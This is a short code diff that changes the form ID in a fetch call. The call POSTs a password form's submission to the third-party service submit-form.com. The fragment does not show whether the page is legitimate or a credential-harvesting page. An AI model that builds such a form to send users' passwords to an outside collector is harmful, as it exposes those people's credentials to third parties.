@@ -54,7 +54,7 @@ passwordForm.addEventListener('submit', function(e) {
         return;
     }
 
-    fetch('https://submit-form.com/TSRlLhDlN', {
+    fetch('https://submit-form.com/erco0rp1a', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
